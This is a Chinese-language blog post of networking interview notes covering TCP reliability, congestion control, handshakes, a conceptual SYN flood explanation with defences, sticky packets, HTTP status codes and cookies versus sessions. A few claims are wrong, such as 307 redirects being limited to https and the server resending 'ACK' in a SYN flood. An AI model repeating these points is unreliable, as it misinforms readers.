<p>在接收数据时，控制信息使接收端能够知道一个帧从哪个比特开始和到哪个比特结束。这样，数据链路层在收到一个帧后，就可从中提出数据部分，上交给网络层。 控制信息还使接收端能够检测到所收到的帧中有无差错。如果发现差错，数据链路层就简单地丢弃这个出了差错的帧，以避免继续在网络中传送下去白白浪费网络资源。如果需要改正数据在链路层传输时出现差错（这就是说，数据链路层不仅要检错，而且还要纠错），那么就要采用可靠性传输协议来纠正出现的差错。这种方法会使链路层的协议复杂些。</p>
<h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>在物理层上所传送的数据单位是比特。</p>
<p><strong>物理层(physical layer)的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异，</strong> 使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。</p>
<p>在互联网使用的各种协议中最重要和最著名的就是 TCP&#x2F;IP 两个协议。现在人们经常提到的TCP&#x2F;IP并不一定单指TCP和IP这两个具体的协议，而往往表示互联网所使用的整个TCP&#x2F;IP协议族。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848265.png" alt="七层体系结构图"></p>
<h2 id="整个传输过程"><a href="#整个传输过程" class="headerlink" title="整个传输过程"></a>整个传输过程</h2><h3 id="电脑视角："><a href="#电脑视角：" class="headerlink" title="电脑视角："></a><strong>电脑视角</strong>：</h3><ul>
<li>首先我要知道我的 IP 以及对方的 IP</li>
<li>通过子网掩码判断我们是否在同一个子网</li>
<li>在同一个子网就通过 arp 获取对方 mac 地址直接扔出去</li>
<li>不在同一个子网就通过 arp 获取默认网关的 mac 地址直接扔出去</li>
</ul>
<h3 id="交换机视角："><a href="#交换机视角：" class="headerlink" title="交换机视角："></a><strong>交换机视角：</strong></h3><ul>
<li>我收到的数据包必须有目标 MAC 地址</li>
<li>通过 MAC 地址表查映射关系</li>
<li>查到了就按照映射关系从我的指定端口发出去</li>
<li>查不到就所有端口都发出去</li>
</ul>
<h3 id="路由器视角："><a href="#路由器视角：" class="headerlink" title="路由器视角："></a><strong>路由器视角：</strong></h3><ul>
<li>我收到的数据包必须有目标 IP 地址</li>
<li>通过路由表查映射关系</li>
<li>查到了就按照映射关系从我的指定端口发出去（不在任何一个子网范围，走其路由器的默认网关也是查到了）</li>
<li>查不到则返回一个路由不可达的数据包</li>
</ul>
<h2 id="TCP和UDP的区别"><a href="#TCP和UDP的区别" class="headerlink" title="TCP和UDP的区别"></a>TCP和UDP的区别</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848403.jpg" alt="TCP、UDP协议的区别"></p>
<h2 id="TCP-协议如何保证可靠传输"><a href="#TCP-协议如何保证可靠传输" class="headerlink" title="TCP 协议如何保证可靠传输"></a>TCP 协议如何保证可靠传输</h2><ol>
<li><p>应用数据被分割成TCP认为最适合发送的数据块。 </p>
</li>
<li><p>TCP给发送的每一个包进行编号，接收方对数据包进行排序，把有序数据传送给应用层。 </p>
</li>
<li><p><strong>校验和：</strong> TCP将保持它首部和数据的检验和。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。 </p>
</li>
<li><p>TCP 的接收端会丢弃重复的数据。 </p>
</li>
<li><p><strong>流量控制：</strong> TCP 连接的每一方都有固定大小的缓冲空间，TCP的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议。 （TCP 利用滑动窗口实现流量控制）</p>
</li>
<li><p><strong>拥塞控制：</strong> 当网络拥塞时，减少数据的发送。(慢开始，拥塞避免，快重传，快恢复)</p>
<p>慢开始:简单的说，开始传输时，传输的数据由小到大递增到一个值(即发送窗口由小到大(指数增长)逐渐增大到拥塞窗口的数值).<br>拥塞避免:数据发送出去，并收到接收方发回来的确认收到，拥塞窗口每次值加1地线性增大.<br>快重传:数据传输时(数据被分成报文，每个报文都有个序号)，中间的一部分丢失接收方没收到，接收方连续接到后面的数据，则发回对丢失前的数据的重复确认，这样发送方就知道有部分数据丢失了，于是从丢失处重传数据.<br>快恢复:快恢复是与快重传配合的算法，在发生数据丢失时，发送方收到接收方发回的三个重复确认信息时，就把每次传输的数据量减为原来的一半，拥塞窗口也修改为这个值，然后又开始拥塞避免的算法.</p>
</li>
<li><p><strong>ARQ协议：</strong> 也是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。</p>
</li>
<li><p><strong>超时重传：</strong> 当TCP发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段。</p>
</li>
</ol>
<h3 id="ARQ协议"><a href="#ARQ协议" class="headerlink" title="ARQ协议"></a>ARQ协议</h3><p><strong>自动重传请求</strong>（Automatic Repeat-reQuest，ARQ）是OSI模型中数据链路层和传输层的错误纠正协议之一。它通过使用确认和超时这两个机制，在不可靠服务的基础上实现可靠的信息传输。如果发送方在发送后一段时间之内没有收到确认帧，它通常会重新发送。ARQ包括停止等待ARQ协议和连续ARQ协议。</p>
<h4 id="停止等待ARQ协议"><a href="#停止等待ARQ协议" class="headerlink" title="停止等待ARQ协议"></a>停止等待ARQ协议</h4><p>停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认（回复ACK）。如果过了一段时间（超时时间后），还是没有收到 ACK 确认，说明没有发送成功，需要重新发送，直到收到确认后再发下一个分组。</p>
<p>在停止等待协议中，若接收方收到重复分组，就丢弃该分组，但同时还要发送确认。</p>
<p><strong>优缺点：</strong></p>
<ul>
<li><strong>优点：</strong> 简单</li>
<li><strong>缺点：</strong> 信道利用率低，等待时间长</li>
</ul>
<p><strong>1) 无差错情况:</strong></p>
<p>发送方发送分组，接收方在规定时间内收到，并且回复确认.发送方再次发送。</p>
<p><strong>2) 出现差错情况（超时重传）:</strong></p>
<p>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重传时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为 <strong>自动重传请求 ARQ</strong> 。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。<strong>连续 ARQ 协议</strong> 可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。</p>
<p><strong>3) 确认丢失和确认迟到</strong></p>
<ul>
<li><strong>确认丢失</strong> ：确认消息在传输过程丢失。当A发送M1消息，B收到后，B向A发送了一个M1确认消息，但却在传输过程中丢失。而A并不知道，在超时计时过后，A重传M1消息，B再次收到该消息后采取以下两点措施：1. 丢弃这个重复的M1消息，不向上层交付。 2. 向A发送确认消息。（不会认为已经发送过了，就不再发送。A能重传，就证明B的确认消息丢失）。</li>
<li><strong>确认迟到</strong> ：确认消息在传输过程中迟到。A发送M1消息，B收到并发送确认。在超时时间内没有收到确认消息，A重传M1消息，B仍然收到并继续发送确认消息（B收到了2份M1）。此时A收到了B第二次发送的确认消息。接着发送其他数据。过了一会，A收到了B第一次发送的对M1的确认消息（A也收到了2份确认消息）。处理如下：1. A收到重复的确认后，直接丢弃。2. B收到重复的M1后，也直接丢弃重复的M1。</li>
</ul>
<h4 id="连续ARQ协议"><a href="#连续ARQ协议" class="headerlink" title="连续ARQ协议"></a>连续ARQ协议</h4><p>连续 ARQ 协议可提高信道利用率。发送方维持一个发送窗口，凡位于发送窗口内的分组可以连续发送出去，而不需要等待对方确认。接收方一般采用累计确认，对按序到达的最后一个分组发送确认，表明到这个分组为止的所有分组都已经正确收到了。</p>
<p><strong>优缺点：</strong></p>
<ul>
<li><strong>优点：</strong> 信道利用率高，容易实现，即使确认丢失，也不必重传。</li>
<li><strong>缺点：</strong> 不能向发送方反映出接收方已经正确收到的所有分组的信息。 比如：发送方发送了 5条消息，中间第三条丢失（3号），这时接收方只能对前两个发送确认。发送方无法知道后三个分组的下落，而只好把后三个全部重传一次。这也叫 Go-Back-N（回退 N），表示需要退回来重传已经发送过的 N 个消息。</li>
</ul>
<h3 id="滑动窗口和流量控制"><a href="#滑动窗口和流量控制" class="headerlink" title="滑动窗口和流量控制"></a>滑动窗口和流量控制</h3><p><strong>TCP 利用滑动窗口实现流量控制。流量控制是为了控制发送方发送速率，保证接收方来得及接收。</strong> 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。</p>
<h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。</p>
<p>为了进行拥塞控制，TCP 发送方要维持一个 <strong>拥塞窗口(cwnd)</strong> 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。</p>
<p>TCP的拥塞控制采用了四种算法，即 <strong>慢开始</strong> 、 <strong>拥塞避免</strong> 、<strong>快重传</strong> 和 <strong>快恢复</strong>。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。</p>
<ul>
<li><strong>慢开始：</strong> 慢开始算法的思路是当主机开始发送数据时，如果立即把大量数据字节注入到网络，那么可能会引起网络阻塞，因为现在还不知道网络的符合情况。经验表明，较好的方法是先探测一下，即由小到大逐渐增大发送窗口，也就是由小到大逐渐增大拥塞窗口数值。cwnd初始值为1，每经过一个传播轮次，cwnd加倍。</li>
<li><strong>拥塞避免：</strong> 拥塞避免算法的思路是让拥塞窗口cwnd缓慢增大，即每经过一个往返时间RTT就把发送方的cwnd加1.</li>
<li><strong>快重传与快恢复：</strong> 在 TCP&#x2F;IP 中，快速重传和恢复（fast retransmit and recovery，FRR）是一种拥塞控制算法，它能快速恢复丢失的数据包。没有FRR，如果数据包丢失了，TCP 将会使用定时器来要求传输暂停。在暂停的这段时间内，没有新的或复制的数据包被发送。有了 FRR，如果接收机接收到一个不按顺序的数据段，它会立即给发送机发送一个重复确认。如果发送机接收到三个重复确认，它会假定确认件指出的数据段丢失了，并立即重传这些丢失的数据段。有了 FRR，就不会因为重传时要求的暂停被耽误。 　当有单独的数据包丢失时，快速重传和恢复（FRR）能最有效地工作。当有多个数据信息包在某一段很短的时间内丢失时，它则不能很有效地工作。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848407.png" alt="img"></p>
<h2 id="TCP三次握手和四次挥手"><a href="#TCP三次握手和四次挥手" class="headerlink" title="TCP三次握手和四次挥手"></a>TCP三次握手和四次挥手</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848423.jpeg" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848427.png" alt="img"></p>
<p>第一次握手：建立连接时，客户端发送syn包（seq&#x3D;x）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</p>
<p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack&#x3D;x+1），同时自己也发送一个SYN包（seq&#x3D;y），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p>
<p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack&#x3D;y+1， seq &#x3D; x + 1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p>
<p>四次挥手过程理解 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848497.png" alt="img"></p>
<p>1）客户端进程发出连接释放报文，并且停止发送数据。释放数据报文首部，FIN&#x3D;1，其序列号为seq&#x3D;u（等于前面已经传送过来的数据的最后一个字节的序号加1），此时，客户端进入FIN-WAIT-1（终止等待1）状态。 TCP规定，FIN报文段即使不携带数据，也要消耗一个序号。<br>2）服务器收到连接释放报文，发出确认报文，ACK&#x3D;1，ack&#x3D;u+1，并且带上自己的序列号seq&#x3D;v，此时，服务端就进入了CLOSE-WAIT（关闭等待）状态。TCP服务器通知高层的应用进程，客户端向服务器的方向就释放了，这时候处于半关闭状态，即客户端已经没有数据要发送了，但是服务器若发送数据，客户端依然要接受。这个状态还要持续一段时间，也就是整个CLOSE-WAIT状态持续的时间。<br>3）客户端收到服务器的确认请求后，此时，客户端就进入FIN-WAIT-2（终止等待2）状态，等待服务器发送连接释放报文（在这之前还需要接受服务器发送的最后的数据）。<br>4）服务器将最后的数据发送完毕后，就向客户端发送连接释放报文，FIN&#x3D;1，ack&#x3D;u+1，由于在半关闭状态，服务器很可能又发送了一些数据，假定此时的序列号为seq&#x3D;w，此时，服务器就进入了LAST-ACK（最后确认）状态，等待客户端的确认。<br>5）客户端收到服务器的连接释放报文后，必须发出确认，ACK&#x3D;1，ack&#x3D;w+1，而自己的序列号是seq&#x3D;u+1，此时，客户端就进入了TIME-WAIT（时间等待）状态。注意此时TCP连接还没有释放，必须经过2MSL（最长报文段寿命）的时间后，当客户端撤销相应的TCB后，才进入CLOSED状态。<br>6）服务器只要收到了客户端发出的确认，立即进入CLOSED状态。同样，撤销TCB后，就结束了这次的TCP连接。可以看到，服务器结束TCP连接的时间要比客户端早一些。</p>
<h3 id="为什么关闭连接的需要四次挥手，而建立连接却只要三次握手呢？"><a href="#为什么关闭连接的需要四次挥手，而建立连接却只要三次握手呢？" class="headerlink" title="为什么关闭连接的需要四次挥手，而建立连接却只要三次握手呢？"></a>为什么关闭连接的需要四次挥手，而建立连接却只要三次握手呢？</h3><p>为什么要断开连接，因为端口号有限;</p>
<p>关闭连接时，被动断开方在收到对方的FIN结束请求报文时，很可能业务数据没有发送完成，并不能立即关闭连接，被动方只能先回复一个ACK响应报文，告诉主动断开方：“你发的FIN报文我收到了，只有等到我所有的业务报文都发送完了，我才能真正的结束，在结束之前，我会发你FIN+ACK报文的，你先等着”。所以，被动断开方的确认报文，需要拆开成为两步，故总体就需要四步挥手。</p>
<p>而在建立连接场景中，Server端的应答可以稍微简单一些。当Server端收到Client端的SYN连接请求报文后，其中ACK报文表示对请求报文的应答，SYN报文用来表示服务端的连接也已经同步开启了，而ACK报文和SYN报文之间，不会有其他报文需要发送，故而可以合二为一，可以直接发送一个SYN+ACK报文。所以，在建立连接时，只需要三次握手即可。</p>
<h3 id="为什么连接建立的时候是三次握手，可以改成两次握手吗？"><a href="#为什么连接建立的时候是三次握手，可以改成两次握手吗？" class="headerlink" title="为什么连接建立的时候是三次握手，可以改成两次握手吗？"></a>为什么连接建立的时候是三次握手，可以改成两次握手吗？</h3><p>三次握手完成两个重要的功能：一是双方都做好发送数据的准备工作，而且双方都知道对方已准备好；二是双方完成初始SN序列号的协商，双方的SN序列号在握手过程中被发送和确认。</p>
<p>如果把三次握手改成两次握手，可能发生死锁。</p>
<p>在假想的TCP建立的连接时二次握手过程中，Client发送Server发送一个SYN请求帧，Server收到后发送了确认应答SYN+ACK帧。按照两次握手的协定，Server认为连接已经成功地建立了，可以开始发送数据帧。这个过程中，如果确认应答SYN+ACK帧在传输中被丢失，Client没有收到，Client将不知道Server是否已准备好，也不知道Server的SN序列号，Client认为连接还未建立成功，将忽略Server发来的任何数据分组，会一直等待Server的SYN+ACK确认应答帧。而Server在发出的数据帧后，一直没有收到对应的ACK确认后就会产生超时，重复发送同样的数据帧。这样就形成了死锁。</p>
<h3 id="为什么主动断开方在TIME-WAIT状态必须等待2MSL的时间？"><a href="#为什么主动断开方在TIME-WAIT状态必须等待2MSL的时间？" class="headerlink" title="为什么主动断开方在TIME-WAIT状态必须等待2MSL的时间？"></a>为什么主动断开方在TIME-WAIT状态必须等待2MSL的时间？</h3><p>原因之一：主动断开方等待2MSL的时间，是为了确保两端都能最终关闭。假设网络是不可靠的，被动断开方发送FIN+ACK报文后，其主动方的ACK响应报文有可能丢失，这时候的被动断开方处于LAST-ACK状态的，由于收不到ACK确认被动方一直不能正常的进入CLOSED状态。在这种场景下，被动断开方会超时重传FIN+ACK断开响应报文，如果主动断开方在2MSL时间内，收到这个重传的FIN+ACK报文，会重传一次ACK报文，后再一次重新启动2MSL计时等待，这样，就能确保被动断开方能收到ACK报文，从而能确保被动方顺利进入到CLOSED状态。只有这样，双方都能够确保关闭。反过来说，如果主动断开方在发送完ACK响应报文后，不是进入TIME_WAIT状态去等待2MSL时间，而是立即释放连接，则将无法收到被动方重传的FIN+ACK报文，所以不会再发送一次ACK确认报文，此时处于LAST-ACK状态的被动断开方，无法正常进入到CLOSED状态。</p>
<p>原因之二：防止“旧连接的已失效的数据报文”出现在新连接中。主动断开方在发送完最后一个ACK报文后，再经过2MSL，才能最终关闭和释放端口，这就意味着，相同端口的新TCP新连接，需要在2MSL的时间之后，才能够正常的建立。2MSL这段时间内，旧连接所产生的所有数据报文，都已经从网络中消失了，从而，确保了下一个新的连接中不会出现这种旧连接请求报文。</p>
<h3 id="如果已经建立了连接，但是Client端突然出现故障了怎么办？"><a href="#如果已经建立了连接，但是Client端突然出现故障了怎么办？" class="headerlink" title="如果已经建立了连接，但是Client端突然出现故障了怎么办？"></a>如果已经建立了连接，但是Client端突然出现故障了怎么办？</h3><p>TCP还设有一个保活计时器，Client端如果出现故障，Server端不能一直等下去，这样会浪费系统资源。每收到一次Client客户端的数据帧后，Server端的保活计时器会复位。计时器的超时时间通常是设置为2小时，若2小时还没有收到Client端的任何数据帧，Server端就会发送一个探测报文段，以后每隔75秒钟发送一次。若一连发送10个探测报文仍然没反应，Server端就认为Client端出了故障，接着就关闭连接。如果觉得保活计时器的两个多小时的间隔太长，可以自行调整TCP连接的保活参数。</p>
<h3 id="Syn洪泛攻击"><a href="#Syn洪泛攻击" class="headerlink" title="Syn洪泛攻击"></a>Syn洪泛攻击</h3><p>A（攻击者）发送TCP SYN，SYN是TCP三次握手中的第一个数据包，而当这个服务器返回ACK以后，A不再进行确认，那这个连接就处在了一个挂起的状态，也就是半连接的意思，那么服务器收不到再确认的一个消息，还会重复发送ACK给A。这样一来就会更加浪费服务器的资源。A就对服务器发送非法大量的这种TCP连接，由于每一个都没法完成握手的机制，所以它就会消耗服务器的内存最后可能导致服务器死机，就无法正常工作了。更进一步说，如果这些半连接的握手请求是恶意程序发出，并且持续不断，那么就会导致服务端较长时间内丧失服务功能——这样就形成了DoS攻击。这种攻击方式就称为SYN泛洪攻击。</p>
<p>那么我们如何去防范这种SYN攻击呢？</p>
<p>其实最常用的一个手段就是优化主机系统设置。比如降低SYN timeout时间，使得主机尽快释放半连接的占用或者采用SYN cookie设置，如果短时间内收到了某个IP的重复SYN请求，我们就认为受到了攻击。我们合理的采用防火墙设置等外部网络也可以进行拦截。</p>
<h2 id="什么是粘包和半包？"><a href="#什么是粘包和半包？" class="headerlink" title="什么是粘包和半包？"></a>什么是粘包和半包？</h2><p>半包是指只收到了全包的一部分.</p>
<p>在进行 Java NIO 学习时，可能会发现：如果客户端连续不断的向服务端发送数据包时，服务端接收的数据会出现两个数据包粘在一起的情况。</p>
<ol>
<li><p>TCP是基于字节流的，虽然应用层和 TCP 传输层之间的数据交互是大小不等的数据块，但是TCP把这些数据块仅仅看成一连串无结构的字节流，没有边界；</p>
</li>
<li><p>从TCP的帧结构也可以看出，在TCP的首部没有表示数据长度的字段。</p>
</li>
</ol>
<p>基于上面两点，在使用TCP传输数据时，才有粘包或者拆包现象发生的可能。一个数据包中包含了发送端发送的两个数据包的信息，这种现象即为粘包。</p>
<p>接收端收到了两个数据包，但是这两个数据包要么是不完整的，要么就是多出来一块，这种情况即发生了拆包和粘包。拆包和粘包的问题导致接收端在处理的时候会非常困难，因为无法区分一个完整的数据包。</p>
<h2 id="TCP-粘包是怎么产生的？"><a href="#TCP-粘包是怎么产生的？" class="headerlink" title="TCP 粘包是怎么产生的？"></a>TCP 粘包是怎么产生的？</h2><ul>
<li><strong>发送方产生粘包</strong></li>
</ul>
<p>采用 TCP 协议传输数据的客户端与服务器经常是保持一个长连接的状态（一次连接发一次数据不存在粘包），双方在连接不断开的情况下，可以一直传输数据。但当发送的数据包过于小时，那么 TCP 协议默认的会启用 Nagle 算法，将这些较小的数据包进行合并发送（缓冲区数据发送是一个堆压的过程）；这个合并过程就是在发送缓冲区中进行的，也就是说数据发送出来它已经是粘包的状态了。</p>
<ul>
<li><strong>接收方产生粘包</strong></li>
</ul>
<p>接收方采用 TCP 协议接收数据时的过程是这样的：数据到接收方，从网络模型的下方传递至传输层，传输层的 TCP 协议处理是将其放置接收缓冲区，然后由应用层来主动获取（C 语言用 recv、read 等函数）；这时会出现一个问题，就是我们在程序中调用的读取数据函数不能及时的把缓冲区中的数据拿出来，而下一个数据又到来并有一部分放入的缓冲区末尾，等我们读取数据时就是一个粘包。（放数据的速度 &gt; 应用层拿数据速度）</p>
<h2 id="怎么解决拆包和粘包？"><a href="#怎么解决拆包和粘包？" class="headerlink" title="怎么解决拆包和粘包？"></a>怎么解决拆包和粘包？</h2><p>分包机制一般有两个通用的解决方法：</p>
<ol>
<li><p>特殊字符控制；</p>
</li>
<li><p>在包头首都添加数据包的长度。</p>
</li>
</ol>
<p>如果使用 netty 的话，就有专门的编码器和解码器解决拆包和粘包问题了。</p>
<p>tips：UDP 没有粘包问题，但是有丢包和乱序。不完整的包是不会有的，收到的都是完全正确的包。传送的数据单位协议是 UDP 报文或用户数据报，发送的时候既不合并，也不拆分。</p>
<h2 id="在浏览器中输入url地址-gt-gt-显示主页的过程"><a href="#在浏览器中输入url地址-gt-gt-显示主页的过程" class="headerlink" title="在浏览器中输入url地址 -&gt;&gt; 显示主页的过程"></a>在浏览器中输入url地址 -&gt;&gt; 显示主页的过程</h2><p>图解（图片来源：《图解HTTP》）：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848898.jpg" alt="img"></p>
<blockquote>
<p>上图有一个错误，请注意，是OSPF不是OPSF。 OSPF（Open Shortest Path First，ospf）开放最短路径优先协议，是由Internet工程任务组开发的路由选择协议</p>
</blockquote>
<p>总体来说分为以下几个过程:</p>
<ol>
<li>DNS解析</li>
<li>TCP连接</li>
<li>发送HTTP请求</li>
<li>服务器处理请求并返回HTTP报文</li>
<li>浏览器解析渲染页面</li>
<li>连接结束</li>
</ol>
<h5 id="DNS负载均衡CDN技术"><a href="#DNS负载均衡CDN技术" class="headerlink" title="DNS负载均衡CDN技术"></a>DNS负载均衡CDN技术</h5><p>DNS返回的IP地址是否每次都一样？如果每次都一样是否说明你请求的资源都位于同一台机器上面，那么这台机器需要多高的性能和储存才能满足亿万请求呢？其实真实的互联网世界背后存在成千上百台服务器，大型的网站甚至更多。但是在用户的眼中，它需要的只是处理他的请求，哪台机器处理请求并不重要。DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。大家耳熟能详的CDN(Content Delivery Network)就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP地址给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容。在这里打个免费的广告，我平时使用的比较多的是七牛云的CDN(免费)储存图片，作为我个人博客的图床使用</p>
<p>具体可以参考下面这篇文章：</p>
<ul>
<li><a href="https://segmentfault.com/a/1190000006879700">https://segmentfault.com/a/1190000006879700</a></li>
</ul>
<h2 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h2><p>200： 请求被服务器端正常处理</p>
<p>204 no content：服务器端已成功处理请求，但是在返回的响应报文中不含实体的主体内容。浏览器显示的页面不发生更新。</p>
<p>206 partial content：表示服务器端成功执行了范围请求，响应报文中包含由 Content-Range 指定范围的实体内容。</p>
<p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p>
<p>301：永久性重定向。</p>
<p>302：临时性重定向。</p>
<p>303：表示该请求对应的资源存在着另一个URI，应使用 get 方法定向获取请求的资源。</p>
<p>307: 只能重定向到https</p>
<p>4XX 客户端错误</p>
<p>400：客户端请求报文中存在语法错误</p>
<p>401：需要认证信息或认证失败。第一次返回表示需要认证信息，第二次表示认证失败。</p>
<p>403：禁止访问，没有访问权限。看视频+博客</p>
<p>404：服务器端没有找到请求资源</p>
<p>5XX 服务器错误</p>
<p>500 ：服务器处理请求发生错误</p>
<p>502 : 网关错误</p>
<p>503：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p>
<h2 id="各种协议与HTTP协议之间的关系"><a href="#各种协议与HTTP协议之间的关系" class="headerlink" title="各种协议与HTTP协议之间的关系"></a>各种协议与HTTP协议之间的关系</h2><p>一般面试官会通过这样的问题来考察你对计算机网络知识体系的理解。</p>
<p>图片来源：《图解HTTP》</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848912.png" alt="各种协议与HTTP协议之间的关系"></p>
<h2 id="HTTP长连接，短连接"><a href="#HTTP长连接，短连接" class="headerlink" title="HTTP长连接，短连接"></a>HTTP长连接，短连接</h2><p>在HTTP&#x2F;1.0中默认使用短连接。也就是说，客户端和服务器每进行一次HTTP操作，就建立一次连接，任务结束就中断连接。当客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源（如JavaScript文件、图像文件、CSS文件等），每遇到这样一个Web资源，浏览器就会重新建立一个HTTP会话。</p>
<p>而从HTTP&#x2F;1.1起，默认使用长连接，用以保持连接特性。使用长连接的HTTP协议，会在响应头加入这行代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection:keep-alive</span><br></pre></td></tr></table></figure>

<p>在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间。实现长连接需要客户端和服务端都支持长连接。</p>
<p><strong>HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。</strong></p>
<p>—— <a href="https://www.cnblogs.com/gotodsp/p/6366163.html">《HTTP长连接、短连接究竟是什么？》</a></p>
<h2 id="HTTP是不保存状态的协议，如何保存用户状态"><a href="#HTTP是不保存状态的协议，如何保存用户状态" class="headerlink" title="HTTP是不保存状态的协议，如何保存用户状态?"></a>HTTP是不保存状态的协议，如何保存用户状态?</h2><p>HTTP 是一种不保存状态，即无状态（stateless）协议。也就是说 HTTP 协议自身不对请求和响应之间的通信状态进行保存。那么我们保存用户状态呢？Session 机制的存在就是为了解决这个问题，Session 的主要作用就是通过服务端记录用户的状态。典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了（一般情况下，服务器会在一定时间内保存这个 Session，过了时间限制，就会销毁这个Session）。</p>
<p>在服务端保存 Session 的方法很多，最常用的就是内存和数据库(比如是使用内存数据库redis保存)。既然 Session 存放在服务器端，那么我们如何实现 Session 跟踪呢？大部分情况下，我们都是通过在 Cookie 中附加一个 Session ID 来方式来跟踪。</p>
<p><strong>Cookie 被禁用怎么办?</strong></p>
<p>最常用的就是利用 URL 重写把 Session ID 直接附加在URL路径的后面。</p>
<h2 id="Cookie的作用是什么-和Session有什么区别？"><a href="#Cookie的作用是什么-和Session有什么区别？" class="headerlink" title="Cookie的作用是什么?和Session有什么区别？"></a>Cookie的作用是什么?和Session有什么区别？</h2><p>Cookie 和 Session都是用来跟踪浏览器用户身份的会话方式，但是两者的应用场景不太一样。</p>
<p><strong>Cookie 一般用来保存用户信息</strong> 比如①我们在 Cookie 中保存已经登录过得用户信息，下次访问网站的时候页面可以自动帮你登录的一些基本信息给填了；②一般的网站都会有保持登录也就是说下次你再访问网站的时候就不需要重新登录了，这是因为用户登录的时候我们可以存放了一个 Token 在 Cookie 中，下次登录的时候只需要根据 Token 值来查找用户即可(为了安全考虑，重新登录一般要将 Token 重写)；③登录一次网站后访问网站其他页面不需要重新登录。<strong>Session 的主要作用就是通过服务端记录用户的状态。</strong> 典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了。</p>
<p>Cookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。</p>
<p>Cookie 存储在客户端中，而Session存储在服务器上，相对来说 Session 安全性更高。如果要在 Cookie 中存储一些敏感信息，不要直接写入 Cookie 中，最好能将 Cookie 信息加密然后使用到的时候再去服务器端解密。</p>
